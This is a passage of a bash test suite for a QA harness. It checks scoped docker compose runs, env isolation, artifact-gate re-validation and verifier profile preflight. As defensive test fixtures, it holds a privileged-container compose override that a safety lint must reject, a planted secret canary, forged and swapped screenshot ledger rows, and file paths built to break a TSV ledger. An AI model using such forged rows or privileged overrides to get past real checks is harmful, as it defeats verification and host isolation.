#!/usr/bin/env bash
exit 0
EOF
chmod +x "$reuse_stage/evidence/harness/probe.sh"
assert_fails "$QA" harness-classify "$reuse_stage/evidence/harness/probe.sh" \
  --classification evidence-only --target current-run \
  --invariant 'probe remains local' --evidence "$TMP/outside-evidence"
"$QA" harness-classify "$reuse_stage/evidence/harness/probe.sh" \
  --classification fixture-pack --target shared-service \
  --invariant 'retry preserves one logical record' \
  --evidence "$reuse_stage/evidence/OR-1" >/dev/null
assert_eq "$(awk -F'\t' '{print $2}' "$reuse_run/regression-candidates.tsv")" \
  "fixture-pack" "a task-local harness gets exactly one promotion classification"
cat >"$TMP/tests-only.patch" <<'EOF'
diff --git a/tests/retry.test.sh b/tests/retry.test.sh
--- a/tests/retry.test.sh
+++ b/tests/retry.test.sh
@@ -1 +1 @@
-false
+true
EOF
assert_file "$("$QA" regression-proposal "$TMP/tests-only.patch")" \
  "a test-only regression proposal is copied to caller-owned evidence"
cat >"$TMP/production.patch" <<'EOF'
diff --git a/src/retry.sh b/src/retry.sh
--- a/src/retry.sh
+++ b/src/retry.sh
@@ -1 +1 @@
-false
+true
EOF
assert_fails "$QA" regression-proposal "$TMP/production.patch"
cat >"$TMP/production-delete.patch" <<'EOF'
diff --git a/src/retry.sh b/src/retry.sh
deleted file mode 100755
--- a/src/retry.sh
+++ /dev/null
@@ -1 +0,0 @@
-false
EOF
assert_fails "$QA" regression-proposal "$TMP/production-delete.patch"
"$QA" finish failed >/dev/null
assert_fails "$QA" curation failed
"$QA" curation completed >/dev/null
cd "$repo" || fail "cd back from qareuse"

# --- infra: stub docker records argv; scoping + lint ------------------------------
mkdir -p "$TMP/stub"
cat >"$TMP/stub/docker" << 'EOF'
#!/usr/bin/env bash
echo "$@" >>"${DOCKER_ARGV_LOG:?}"
# `compose port` readbacks return nothing; `ps` listings return nothing.
exit 0
EOF
chmod +x "$TMP/stub/docker"
export PATH="$TMP/stub:$PATH" DOCKER_ARGV_LOG="$TMP/docker.log"

"$QA" start --target HEAD --task inf-1 >/dev/null
"$QA" infra up --services postgres,redis >/dev/null
assert_contains "$(cat "$DOCKER_ARGV_LOG")" "compose -p crew-qa-proj-inf-1" "task-scoped compose project"
assert_contains "$(cat "$DOCKER_ARGV_LOG")" "--profile postgres" "requested profile only"
grep -q -- '--profile temporal' "$DOCKER_ARGV_LOG" && fail "unrequested profile must not start"
rd2="$repo/.crew/qa/$(readlink "$repo/.crew/qa/current")"
assert_contains "$(cat "$rd2/ports.env")" "QA_BASE_URL=http://127.0.0.1:" "ports.env carries the service base url"

# --- infra: the declaration contains the boot -------------------------------------
# The `infra up` above DECLARED this run's need (postgres,redis). A later up
# naming a service outside it is refused BEFORE docker runs; a repeat is not
# (an infra failure HOLDS the run, and the resume re-runs the held step).
assert_file "$rd2/infra.declared"
: >"$DOCKER_ARGV_LOG"
assert_fails "$QA" infra up --services postgres,temporal
grep -q -- '--profile temporal' "$DOCKER_ARGV_LOG" && fail "a refused widening must boot nothing"
: >"$DOCKER_ARGV_LOG"
"$QA" infra up --services postgres,redis >/dev/null
assert_contains "$(cat "$DOCKER_ARGV_LOG")" "--profile redis" "a repeat of the declared list still boots"

# infra detect: scans deps; only what the service needs.
: >"$DOCKER_ARGV_LOG"
printf 'psycopg2==2.9\nredis==5.0\nrequests\n' >"$repo/requirements.txt"
git -C "$repo" add -A && git -C "$repo" -c user.email=t@t -c user.name=t commit -qm deps
assert_eq "$("$QA" infra detect)" "postgres,redis" "detect finds pg+redis from deps, not temporal/wiremock"

# infra up with NO services boots no containers, still allocates the port.
: >"$DOCKER_ARGV_LOG"
"$QA" infra up >/dev/null
grep -q ' up -d' "$DOCKER_ARGV_LOG" && fail "no-service infra up must not run docker compose up"
assert_contains "$(cat "$rd2/ports.env")" "QA_BASE_URL=http://127.0.0.1:" "no-service up still allocates QA_PORT"
# unknown service fails closed.
assert_fails "$QA" infra up --services postgres,mongo

: >"$DOCKER_ARGV_LOG"
"$QA" infra down --task inf-1 >/dev/null
assert_contains "$(cat "$DOCKER_ARGV_LOG")" "compose -p crew-qa-proj-inf-1 down -v --remove-orphans" "down is project-scoped"

# Override lint fails closed on host-touching constructs.
printf 'services:\n  bad:\n    image: x\n    privileged: true\n' >"$repo/docker-compose.qa.yml"
git -C "$repo" add -A && git -C "$repo" -c user.email=t@t -c user.name=t commit -qm override
cat >"$qa_cfg" << 'EOF'
qa:
  mocks_compose: docker-compose.qa.yml
EOF
"$QA" finish cancelled >/dev/null 2>&1 || true
"$QA" start --target HEAD --task inf-2 >/dev/null
# The override is only consulted when compose actually runs, so request a
# service; the lint then fails closed before any `up`.
assert_fails "$QA" infra up --services postgres              # fail CLOSED (exit != 0)
err="$("$QA" infra up --services postgres 2>&1 1>/dev/null || true)"
assert_contains "$err" "safety lint" "privileged override fails closed"
grep -q ' up -d' "$DOCKER_ARGV_LOG" && fail "no docker up may run after a lint failure"
"$QA" finish cancelled >/dev/null

# --- exit 4 when the service contract is absent -----------------------------
# Its own run: a run that RECORDS cases must boot the deliverable now, so the
# serve-less config cannot also be the one the finish paths below use.
cat >"$qa_cfg" << 'EOF'
qa:
  seed: "echo no-service-contract"
EOF
"$QA" start --target HEAD --task noserve-1 >/dev/null
set +e; "$QA" serve >/dev/null 2>&1; rc_serve=$?
set -e
assert_eq "$rc_serve" "4" "serve exits 4 when qa.serve unset"
"$QA" finish cancelled >/dev/null

# --- finish success/unverifiable paths + minimal-env isolation ---------------
# Reset the home config to the serve/seed-bearing copy (no mocks_compose).
cat >"$qa_cfg" << 'EOF'
qa:
  serve: "echo fin-serve; sleep 30"
  health: "true"
  health_timeout: 5
  seed: "echo canary=${CANARY:-none} probe=${QA_PROBE:-none}"
EOF
"$QA" start --target HEAD --task fin-1 >/dev/null
rd3="$repo/.crew/qa/$(readlink "$repo/.crew/qa/current")"
# Minimal-env: an ambient secret must NOT reach qa.seed; ports.env vars must.
printf 'QA_PROBE=from-ports-env\n' >"$rd3/ports.env"
export CANARY=leaked-secret
"$QA" seed >/dev/null 2>&1 || true
grep -q 'canary=leaked-secret' "$rd3/logs/seed.log" && fail "ambient env leaked into qa.seed"
assert_contains "$(cat "$rd3/logs/seed.log")" "canary=none" "ambient secret stripped by env -i"
assert_contains "$(cat "$rd3/logs/seed.log")" "probe=from-ports-env" "ports.env reaches the minimal env"
unset CANARY
# An unconfigured execution is refused after the selected behavioral case is
# proven to exist; the old bare `cmd e2e` grammar is intentionally gone.
# unverifiable refusal + all-pass success
qa_case OK-1 pass api --grade A --evidence "$(case_evidence OK-1)" >/dev/null
assert_fails "$QA" cmd e2e --cases OK-1
"$QA" case UV-1 unverifiable --tier api >/dev/null
terminalize_steps
assert_fails "$QA" finish passed                              # unverifiable in ledger
qa_case UV-1 pass api --grade B --evidence "$(case_evidence UV-1)" >/dev/null
prepare_pass
# D5, the refusing direction: an all-pass ledger is NOT enough on its own.
assert_fails "$QA" finish passed                              # no visual artifact yet
assert_eq "$(sed -n 's/^outcome=//p' "$rd3/run.meta")" "running" \
  "a refused finish never rewrites the outcome"
mk_png "$TMP/fin.png"
"$QA" visual "$TMP/fin.png" --case UV-1 >/dev/null
env2="$("$QA" finish passed)"
assert_contains "$env2" "QA_VERDICT=passed" "all-pass ledger + a visual allows finish passed"
assert_contains "$env2" "QA_VISUALS=1" "the envelope carries the visual count"

# --- D6: finish passed refuses on an EMPTY ledger ---------------------------------
# A fresh commit, because HEAD now carries fin-1's attestation and the whole
# point of this section is that a run which proved nothing mints NOTHING.
printf 'empty-ledger\n' >"$repo/d6.txt"
git -C "$repo" add -A && git -C "$repo" -c user.email=t@t -c user.name=t commit -qm d6
sha_d6="$(git -C "$repo" rev-parse HEAD)"
"$QA" start --target "$sha_d6" --task empty-1 >/dev/null
rd4="$repo/.crew/qa/$(readlink "$repo/.crew/qa/current")"
mk_png "$TMP/d6.png"
"$QA" visual "$TMP/d6.png" >/dev/null                         # a picture, but zero cases
QA_TEST_NO_FULL_FLOW=1 prepare_pass
assert_fails "$QA" finish passed
assert_eq "$(sed -n 's/^outcome=//p' "$rd4/run.meta")" "running" "an empty ledger never passes"
assert_no_file "$repo/.crew/qa/passed/$sha_d6" "a run that verified nothing mints no attestation"
"$QA" finish cancelled >/dev/null

# --- D5: the gate RE-VALIDATES at finish; it does not just count rows -------------
"$QA" start --target "$sha_d6" --task vis-1 >/dev/null
rd5="$repo/.crew/qa/$(readlink "$repo/.crew/qa/current")"
qa_case V-1 pass api --grade A >/dev/null
mk_png "$TMP/gone.png"
"$QA" visual "$TMP/gone.png" --case V-1 >/dev/null
prepare_pass
rm -f "$TMP/gone.png"                          # registered from a temp dir, then cleaned
assert_fails "$QA" finish passed               # a row whose artifact is gone is not proof
assert_no_file "$repo/.crew/qa/passed/$sha_d6" "a vanished artifact mints no attestation"
# A hand-forged row whose path does not resolve cannot mint a pass.
printf '/nope/forged.png\tpng\t9\tV-1\tnow\t-\n' >"$rd5/visuals.tsv"
assert_fails "$QA" finish passed
# ...nor one whose KIND is blank, over a file that really exists: the re-check
# compares real magic bytes against the claim, so a rejection must never satisfy
# the row by matching two empty strings.
printf 'text pretending to be a screenshot\n' >"$TMP/notimg.bin"
printf '%s\t\n' "$TMP/notimg.bin" >"$rd5/visuals.tsv"
assert_fails "$QA" finish passed
# The BYTES are re-read, not just the path: an artifact that survives but is no
# longer an image (a truncated capture, a cleanup stub) counts for nothing.
: >"$rd5/visuals.tsv"
mk_png "$TMP/swapped.png"
"$QA" visual "$TMP/swapped.png" --case V-1 >/dev/null
printf 'not an image anymore\n' >"$TMP/swapped.png"           # exists; kind is now a lie
assert_fails "$QA" finish passed
assert_no_file "$repo/.crew/qa/passed/$sha_d6" "a swapped artifact mints no attestation"
rm -f "$TMP/swapped.png"
# ...and the row's CLAIM is checked against the bytes, not merely "is it an
# image at all": swap a png for a real JPEG and the row still lies. A non-image
# overwrite (above) is refused one guard earlier and cannot prove this.
: >"$rd5/visuals.tsv"
mk_png "$TMP/kindswap.png"
"$QA" visual "$TMP/kindswap.png" --case V-1 >/dev/null
mk_jpeg "$TMP/kindswap.png"                          # real image, wrong kind
assert_fails "$QA" finish passed
assert_no_file "$repo/.crew/qa/passed/$sha_d6" "a kind-swapped artifact mints no attestation"
rm -f "$TMP/kindswap.png"
mk_png "$TMP/real.png"
"$QA" visual "$TMP/real.png" --case V-1 >/dev/null
assert_contains "$("$QA" finish passed)" "QA_VERDICT=passed" "a live artifact opens the gate"

# --- visual: a hostile path is refused, and never corrupts the ledger -------------
"$QA" start --target "$sha_d6" --task path-1 >/dev/null
rd6="$repo/.crew/qa/$(readlink "$repo/.crew/qa/current")"
qa_case P-1 pass api --grade A >/dev/null
mk_png "$TMP/keep.png"
"$QA" visual "$TMP/keep.png" --case P-1 >/dev/null
# A newline is refused like a tab: both break the tsv, and the ledger REWRITE must
# never run on a value it would corrupt - a refused path leaves prior rows intact.
nl_path="$(printf '%s/a\nb.png' "$TMP")"
cp "$TMP/keep.png" "$nl_path"
assert_fails "$QA" visual "$nl_path"
assert_eq "$(wc -l <"$rd6/visuals.tsv" | tr -d ' ')" "1" "a refused path leaves the ledger intact"
assert_contains "$("$QA" status)" "visuals: 1" "the already-registered visual survives"
# A backslash in the path must still de-duplicate: the rewrite must compare the
# path LITERALLY, never escape-process it.
bs_path="$TMP/a\\tb.png"
cp "$TMP/keep.png" "$bs_path"
"$QA" visual "$bs_path" --case P-1 >/dev/null
"$QA" visual "$bs_path" --case P-1 >/dev/null
assert_eq "$(wc -l <"$rd6/visuals.tsv" | tr -d ' ')" "2" "a backslash path registers once, not twice"
prepare_pass
assert_contains "$("$QA" finish passed)" "QA_VISUALS=2" "each live artifact counts exactly once"

# --- step evidence: refuses while the live stack is still up ----------------------
"$QA" start --target "$sha_d6" --task ev-1 >/dev/null
assert_fails "$QA" step evidence completed                    # nothing registered yet
assert_contains "$("$QA" step evidence skipped --note 'no visual surface')" \
  "evidence -> skipped" "skipped is the documented escape"
mk_png "$TMP/ev.png"
"$QA" visual "$TMP/ev.png" >/dev/null
assert_contains "$("$QA" step evidence completed)" "evidence -> completed" \
  "a registered visual closes the evidence step"
assert_contains "$("$QA" status)" "visuals: 1" "status previews the gate before finish"

# --- relay-report: the relay contract rendered from the run's own state -----------
assert_fails "$QA" relay-report                               # nothing to relay yet
mkdir -p "$("$QA" evidence-dir)/e"
printf 'R-1 evidence\n' >"$("$QA" evidence-dir)/e/R-1"
qa_case R-1 pass api --grade A --evidence e/R-1 >/dev/null
"$QA" visual "$TMP/ev.png" --case R-1 >/dev/null
prepare_pass
"$QA" finish passed >/dev/null
rr="$("$QA" relay-report)"
assert_contains "$rr" "QA_VERDICT=passed" "relay-report carries the envelope"
assert_contains "$rr" "R-1" "relay-report carries the case table"
assert_contains "$rr" 'Full flow: `FF-DEFAULT`' \
  "relay-report surfaces the frozen full-flow ids"
assert_contains "$rr" "/report.md" \
  "relay-report points to the authoritative canonical report"
assert_contains "$rr" "$TMP/ev.png" "relay-report names the visual to embed"
assert_contains "$rr" "verified statically" "relay-report carries the correction duty"
assert_contains "$rr" "fetch-check" "relay-report requires fetch-check before posting"
# The contract addresses the CALLER, and the caller is in a DIFFERENT worktree by
# construction (qa runs in its own). An un-aimable relay-report is unrunnable by
# the one actor it is written for.
caller="$(make_repo caller)"
rr2="$(cd "$caller" && "$QA" relay-report --repo "$repo")"
assert_contains "$rr2" "QA_VERDICT=passed" "the caller can aim relay-report at the run from its own worktree"
assert_contains "$rr2" "$TMP/ev.png" "the aimed report still carries the evidence"
assert_fails env -C "$caller" "$QA" relay-report --repo "$TMP/not-a-repo"
# The artifact list is re-validated like the envelope: the two must never
# contradict each other in one report (QA_VISUALS=0 above, a dead path below).
rm -f "$TMP/ev.png"
rr3="$("$QA" relay-report)"
assert_contains "$rr3" "QA_VISUALS=0" "a vanished artifact drops out of the envelope"
case "$rr3" in *"$TMP/ev.png"*) fail "relay-report must not offer a dead artifact to embed" ;; esac

# --- fetch-check: HTTP-GET every embedded visual URL, refuse on non-200 -----------
# Stub curl (already on PATH from the docker-stub export above): the URL is
# always its last argument, so the stub reads it off there regardless of the
# -H auth flag fetch-check may prepend. CURL_FAIL_URL opts one URL into a
# configurable failure code; every other URL returns 200. CURL_ARGV_LOG, when
# set, records the full argv - proving -L is actually passed, the defect
# class where an unfollowed redirect (GitHub's raw-embed 302) reads as non-200.
cat >"$TMP/stub/curl" << 'EOF'
#!/usr/bin/env bash
[ -z "${CURL_ARGV_LOG:-}" ] || printf '%s\n' "$*" >>"$CURL_ARGV_LOG"
url="${@: -1}"
code="200"
if [ -n "${CURL_FAIL_URL:-}" ] && [ "$url" = "$CURL_FAIL_URL" ]; then
  code="${CURL_FAIL_CODE:-404}"
fi
printf '%s' "$code"
EOF
chmod +x "$TMP/stub/curl"

assert_fails "$QA" fetch-check                                 # at least one URL required
out="$("$QA" fetch-check "https://example.com/a.png")"
assert_contains "$out" "1 url(s) OK" "fetch-check: a live URL passes"

export CURL_ARGV_LOG="$TMP/curl.log"
"$QA" fetch-check "https://example.com/redirects.png" >/dev/null
assert_contains "$(cat "$CURL_ARGV_LOG")" "-L" \
  "fetch-check: curl is called with -L, so a followed 302 never reads as non-200"
unset CURL_ARGV_LOG

export CURL_FAIL_URL="https://example.com/bad.png" CURL_FAIL_CODE="404"
out=""; rc=0
out="$("$QA" fetch-check "$CURL_FAIL_URL" 2>&1)" || rc=$?
assert_eq "$rc" "1" "fetch-check: a non-200 refuses"
assert_contains "$out" "$CURL_FAIL_URL" "fetch-check: refusal names the offending URL"
assert_contains "$out" "404" "fetch-check: refusal names the status"
assert_contains "$out" "private repo" "fetch-check: refusal notes the private-repo ambiguity"

out=""; rc=0
out="$("$QA" fetch-check "https://example.com/good.png" "$CURL_FAIL_URL" 2>&1)" || rc=$?
assert_eq "$rc" "1" "fetch-check: a non-200 among several still refuses"
assert_contains "$out" "$CURL_FAIL_URL" "fetch-check: still names the offending URL among several"
unset CURL_FAIL_URL CURL_FAIL_CODE

# --- agent verb: exact-ref QA verifier facade -------------------------------
# The adapter keeps the public QA envelope but owns no pane/session lifecycle.
# ac-verify receives the exact target, execution identity, combined brief, and
# a caller-owned evidence directory that must survive verifier lease return.
qa_brief="$TMP/qa-agent-brief.md"
printf 'Exercise the acceptance criteria.\n' >"$qa_brief"
qa_evidence="$TMP/qa-agent-evidence"
export QA_VERIFY_LOG="$TMP/qa-verify.log"
export QA_BRIEF_CAPTURE="$TMP/qa-agent-charter.md"
cat >"$TMP/stub/ac-verify" <<'EOF'
#!/usr/bin/env bash
set -euo pipefail
printf '%s\n' "$*" >>"$QA_VERIFY_LOG"
[ "$1" = qa ] || exit 2
shift
output=""; evidence=""; ref=""; history=""; brief=""; report=""
while [ $# -gt 0 ]; do
  case "$1" in
    --output) output="$2"; shift ;;
    --evidence-dir) evidence="$2"; shift ;;
    --ref) ref="$2"; shift ;;
    --history) history="$2"; shift ;;
    --brief) brief="$2"; shift ;;
    --report) report="$2"; shift ;;
    --profile) shift ;;
    --repo|--family|--caller|--owner|--harness|--model|--effort) shift ;;
    *) exit 2 ;;
  esac
  shift
done
[ -s "$brief" ] || exit 3
cp "$brief" "$QA_BRIEF_CAPTURE"
[ -z "$history" ] || jq -e 'type == "object" and (.verdict | type) == "string"' "$history" >/dev/null
mkdir -p "$evidence"
if [ "$QA_VERIFY_BAD" = 1 ]; then
  printf '{"verdict":"mystery"}\n' >"$output"
else
  mkdir -p "$(dirname "$report")"
  printf 'verdict: passed\n\n# QA Stage Report\n' >"$report"
  jq -n --arg ref "$ref" --arg report "$report" \
    '{verdict:"passed",summary:"qa clean",evidence:[],verified_ref:$ref,report:$report}' >"$output"
  printf 'QA_VERDICT=passed\n' >"$evidence/relay-report.md"
  cp "$output" "$evidence/verdict.json"
fi
cat "$output"
EOF
chmod +x "$TMP/stub/ac-verify"
export QA_VERIFY_BAD=0
# The PROFILE RESOLVE preflight reads the fleet-home config, so the agent happy
# path needs a COMPLETE flat service contract restored (earlier infra/finish
# tests left proj.yaml carrying only a seed).
cat >"$qa_cfg" << 'EOF'
qa:
  serve: "echo home-serve; sleep 30"
  health: "true"
  health_timeout: 5
EOF
target_ref="$(git -C "$repo" rev-parse HEAD)"
# proj is FLAT with a complete service contract (qa.serve + qa.health), so the
# PROFILE RESOLVE preflight resolves profile-ready and spawns the verifier.
out="$(AC_CREW_ID=qa-flow-implement AC_FLEET_SCOPE=qa-flow AC_VERIFY_BIN="$TMP/stub/ac-verify" \
  "$QA" agent --target HEAD --task ag-1 --brief "$qa_brief" --evidence "$qa_evidence")"
assert_contains "$out" "verdict: passed" "agent relays the verifier verdict"
assert_contains "$out" "qa-agent round 1" "agent names the verifier round"
assert_contains "$out" "QA_PROFILE_STATUS=profile-ready" "a ready flat profile is reported"
call="$(tail -n 1 "$QA_VERIFY_LOG")"
assert_contains "$call" "qa --repo $repo" "qa delegates to the verifier facade"
assert_contains "$call" "--ref $target_ref" "qa passes the exact target ref"
assert_contains "$call" "--family qa-flow" "qa passes the supervising family"
assert_contains "$call" "--caller qa-flow-implement" "qa names the execution caller"
assert_contains "$call" "--evidence-dir $qa_evidence" "qa exports to caller-owned evidence"
# The immutable profile is frozen caller-side and handed to the facade.
prof1="$repo/.crew/qa/agent-ag-1-r1.profile/profile.json"
assert_contains "$call" "--profile $prof1" "qa hands the frozen profile to the facade"
assert_file "$prof1" "the preflight freezes an immutable qa-profile.json"
assert_eq "$(jq -r .schema "$prof1")" "agentcrew.qa-profile/v1" "the profile carries the schema tag"
assert_eq "$(jq -r .profile_key "$prof1")" "proj" "a flat profile key is the project alone"
assert_eq "$(jq -r .source.ref "$prof1")" "$target_ref" "the profile freezes the exact source ref"
assert_eq "$(jq -r '.target // "none"' "$prof1")" "none" "a flat profile carries no scope/app target"
assert_eq "$(jq -r .provenance.project_config_sha256 "$prof1")" \
  "$(shasum -a 256 <"$qa_cfg" | awk '{print $1}')" "provenance records the project-config hash"
assert_eq "$(jq -r '.provenance.repo_knowledge_sha256 | length' "$prof1")" "64" \
  "provenance records a repo-knowledge hash (empty-source hash when absent)"
assert_file "$qa_evidence/verdict.json" "verifier verdict survives lease return"
assert_file "$qa_evidence/relay-report.md" "relay report survives lease return"
assert_no_file "$repo/.crew/qa/agent-ag-1.session" "normal QA no longer writes a session"
assert_no_file "$repo/.crew/qa/agent-ag-1.pane" "normal QA no longer writes a pane"

# A later QA round is a fresh verifier with structured output history only.
AC_CREW_ID=qa-flow-implement AC_FLEET_SCOPE=qa-flow AC_VERIFY_BIN="$TMP/stub/ac-verify" \
  "$QA" agent --target HEAD --task ag-1 --brief "$qa_brief" --evidence "$qa_evidence" >/dev/null
call="$(tail -n 1 "$QA_VERIFY_LOG")"
assert_contains "$call" "--history $repo/.crew/qa/agent-ag-1-r1.json" "later QA carries structured history"
assert_contains "$call" "--profile $repo/.crew/qa/agent-ag-1-r2.profile/profile.json" "each round freezes its own profile"
case "$call" in *--resume*|*--replace-pane*) fail "QA adapter must not own pane/session lifecycle" ;; esac

# Routed panes.qa is an explicit execution-caller decision. Omission or a bad
# selector fails before the verifier stub is invoked; a valid selection is
# frozen into the profile hash and passed as one atomic launch triple.
dispatch_cfg="$AC_HOME/config/crew-dispatch.json"
cat >"$dispatch_cfg" <<'EOF'
{
  "panes": {
    "qa": {
      "rules": [
        {
          "when": "The round spans stateful backend dependencies.",
          "use": {
            "harness": "opencode",
            "model": "openrouter/z-ai/glm-5.2",
            "effort": ""
          },
          "why": "Use a long-horizon backend QA profile."
        }
      ],
      "default": {
        "harness": "opencode",
        "model": "openrouter/qwen/qwen3.7-plus",
        "effort": ""
      }
    }
  }
}
EOF
before_verify_calls="$(wc -l <"$QA_VERIFY_LOG" | tr -d ' ')"
assert_fails env AC_CREW_ID=qa-flow-implement AC_FLEET_SCOPE=qa-flow \
  AC_VERIFY_BIN="$TMP/stub/ac-verify" "$QA" agent --target HEAD --task ag-route-missing \
  --brief "$qa_brief" --evidence "$TMP/qa-route-missing-evidence"
assert_eq "$(wc -l <"$QA_VERIFY_LOG" | tr -d ' ')" "$before_verify_calls" \
  "omitting a routed QA selection creates no verifier pane"
assert_fails env AC_CREW_ID=qa-flow-implement AC_FLEET_SCOPE=qa-flow \
  AC_VERIFY_BIN="$TMP/stub/ac-verify" "$QA" agent --target HEAD --task ag-route-bad \
  --brief "$qa_brief" --evidence "$TMP/qa-route-bad-evidence" --qa-rule 9
assert_eq "$(wc -l <"$QA_VERIFY_LOG" | tr -d ' ')" "$before_verify_calls" \
  "an invalid routed QA selection creates no verifier pane"
AC_CREW_ID=qa-flow-implement AC_FLEET_SCOPE=qa-flow AC_VERIFY_BIN="$TMP/stub/ac-verify" \
  "$QA" agent --target HEAD --task ag-route --brief "$qa_brief" \
  --evidence "$TMP/qa-route-evidence" --qa-rule 1 >/dev/null
route_profile="$repo/.crew/qa/agent-ag-route-r1.profile/profile.json"
assert_eq "$(jq -r .routing.rule "$route_profile")" "1" \
  "the frozen profile records the caller-selected QA rule"
assert_eq "$(jq -r .routing.use.model "$route_profile")" "openrouter/z-ai/glm-5.2" \
  "the routing receipt binds the selected atomic model"
assert_eq "$(jq -r .routing.dispatch_sha256 "$route_profile")" \
  "$(shasum -a 256 <"$dispatch_cfg" | awk '{print $1}')" \
  "the routing receipt binds the dispatch config"
route_call="$(tail -n 1 "$QA_VERIFY_LOG")"
assert_contains "$route_call" "--harness opencode --model openrouter/z-ai/glm-5.2" \
  "the selected profile passes explicitly through the verifier facade"
rm -f "$dispatch_cfg"

# A facade result outside the canonical verdict enum fails closed.
export QA_VERIFY_BAD=1
assert_fails env AC_CREW_ID=qa-flow-implement AC_FLEET_SCOPE=qa-flow \
  AC_VERIFY_BIN="$TMP/stub/ac-verify" "$QA" agent --target HEAD --task ag-bad \
  --brief "$qa_brief" --evidence "$TMP/qa-agent-bad-evidence"
export QA_VERIFY_BAD=0

# --- PROFILE RESOLVE preflight: the 5 fail-closed statuses + freeze ----------
# BEFORE ac-verify leases a worktree or spawns a pane, cmd_agent compiles +
# validates + freezes an immutable qa-profile.json from the two durable sources
# (project config + repo-knowledge scope/app membership). Only profile-ready
# spawns; every other status returns structured and creates NO verifier pane.
# Single-repo (flat + scoped) only - the separate-E2E lease is Story 3.
pf="$(make_repo pf)"
pf_cfg="$AC_HOME/projects/pf.yaml"
pf_ev="$TMP/pf-ev"
pf_complete() { printf 'qa:\n  serve: "echo pf-serve"\n  health: "true"\n  health_timeout: 5\n' >"$pf_cfg"; }
pfrun() {
  # pfrun <task> [flags...] - drive the QA adapter over the ac-verify stub.
  AC_CREW_ID=pf-implement AC_VERIFY_BIN="$TMP/stub/ac-verify" \
    "$QA" agent --target HEAD --task "$1" --brief "$qa_brief" --evidence "$pf_ev" "${@:2}"
}
pf_no_pane() {
  # pf_no_pane <status> <task> [flags...] - the run refuses with <status> and
  # spawns NO verifier: the ac-verify stub log does not advance.
  local want="$1" task="$2" before out; shift 2
  before="$(wc -l <"$QA_VERIFY_LOG" | tr -d ' ')"
  out="$(pfrun "$task" "$@" 2>&1)" && fail "expected $want refusal for $task"
  assert_contains "$out" "QA_PROFILE_STATUS=$want" "$task -> $want"
  assert_eq "$(wc -l <"$QA_VERIFY_LOG" | tr -d ' ')" "$before" "$want spawns no verifier pane"
}
cd "$pf"

# needs-profile: no project config installed at the canonical home path.
rm -f "$pf_cfg"
pf_no_pane needs-profile pf-nocfg

# needs-profile: a flat config missing the service contract (qa.serve/health).
printf 'qa:\n  health_timeout: 5\n' >"$pf_cfg"
pf_no_pane needs-profile pf-incomplete

# profile-conflict: repo knowledge declares scopes, the config carries no
# qa.scopes block - the two durable sources disagree (F8 mode mismatch).
mkdir -p "$AC_HOME/records/repo-knowledge"
printf '# Repo knowledge: pf\n\n- scope orchid = orchid-service | src: cmd:true | at: deadbeef 2026-07-21 | by: fam\n\n## Superseded\n\n' \
  >"$AC_HOME/records/repo-knowledge/pf.md"
pf_complete
pf_no_pane profile-conflict pf-f8 --scope orchid --app orchid-service
# F27: cmd_agent's mode-mismatch refusal now flows through the SAME chain as
# cmd_start's qa_validate_selection (qa_selection_precedence) - it carries the
# chain's own "F8 MODE MISMATCH" tag, not a separately-worded reimplementation.
out="$(pfrun pf-f8-text --scope orchid --app orchid-service 2>&1)" && fail "F27: F8 mismatch must still refuse"
assert_contains "$out" "F8 MODE MISMATCH" \
  "F27: cmd_agent's mode-mismatch text now matches qa_validate_selection's canonical tag"
rm -f "$AC_HOME/records/repo-knowledge/pf.md"

# A selector on a genuinely FLAT project is a caller-argument error, refused
# (not one of the 5 statuses) and still spawns nothing.
pf_complete
before="$(wc -l <"$QA_VERIFY_LOG" | tr -d ' ')"
out="$(pfrun pf-sel --scope orchid --app orchid-service 2>&1)" && fail "flat + selector must refuse"
assert_contains "$out" "declares no scopes" "flat project rejects a scope selector"
assert_eq "$(wc -l <"$QA_VERIFY_LOG" | tr -d ' ')" "$before" "the flat-selector refusal spawns nothing"

# ask-user: a declared secret resolver with no authorized fixture profile
# cannot be resolved mechanically - the chief/captain must authorize. Only the
# reference NAME reaches the resolver; a raw secret value never does.
printf 'qa:\n  serve: "echo pf-serve"\n  health: "true"\n  fixtures:\n    resolver: fleet-secret-profile\n' >"$pf_cfg"
before="$(wc -l <"$QA_VERIFY_LOG" | tr -d ' ')"
out="$(pfrun pf-ask 2>&1)" && fail "ask-user must hold delivery"
assert_contains "$out" "QA_PROFILE_STATUS=ask-user" "an unauthorized secret resolver holds for the captain"
assert_contains "$out" "fleet-secret-profile" "the ask names the resolver reference"
assert_eq "$(wc -l <"$QA_VERIFY_LOG" | tr -d ' ')" "$before" "ask-user spawns no verifier pane"

# profile-stale: a durable source changes between freeze and spawn -> the frozen
# hash no longer matches, so abort without spawning.
pf_complete
stale_hook="$TMP/pf-recheck-hook.sh"
# shellcheck disable=SC2016 # The generated hook must expand its own first argument.
printf '#!/usr/bin/env bash\nprintf "\\n# mutated after freeze\\n" >>"$1"\n' >"$stale_hook"
chmod +x "$stale_hook"
before="$(wc -l <"$QA_VERIFY_LOG" | tr -d ' ')"
out="$(AC_QA_PROFILE_RECHECK_HOOK="$stale_hook" pfrun pf-stale 2>&1)" && fail "a post-freeze source change is stale"
assert_contains "$out" "QA_PROFILE_STATUS=profile-stale" "a post-freeze source mutation is profile-stale"
assert_eq "$(wc -l <"$QA_VERIFY_LOG" | tr -d ' ')" "$before" "profile-stale spawns no verifier pane"

# --- ship receipt freeze: explicit --ship-run only, never the `current` link ------
pf_sha="$(git -C "$pf" rev-parse HEAD)"
ship_rcpt() {
  # ship_rcpt <test-dir> <sha> - a qualifying run-scoped ship test receipt.
  mkdir -p "$1"
  {
    printf 'schema=agentcrew.ship-test-receipt/v1\nsource_sha=%s\n' "$2"
    printf 'qualification=qualifies\nreason=executed\nship_run=fixture\n'
    printf 'command_sha256=%s\n' "$(printf 'c' | shasum -a 256 | awk '{print $1}')"
    printf 'output_sha256=%s\n' "$(printf 'o' | shasum -a 256 | awk '{print $1}')"
    printf 'started_at=2026-07-25T00:00:00Z\ncompleted_at=2026-07-25T00:00:05Z\n'
    printf 'exit_code=0\n'
  } >"$1/receipt.env"
}
ship_rcpt "$pf/.crew/ship/runA/test" "$pf_sha"
ship_rcpt "$pf/.crew/ship/runB/test" "0000000000000000000000000000000000000000"
ln -sfn runA "$pf/.crew/ship/current"
pfrun pf-shipa --ship-run runA >/dev/null 2>&1 || true
assert_eq "$(ac_meta_read "$pf/.crew/qa/agent-pf-shipa-r1.profile/ship/test-receipt.env" qualification)" \
  "qualifies" "an explicit --ship-run freezes that run's qualifying receipt"
pfrun pf-shipb >/dev/null 2>&1 || true
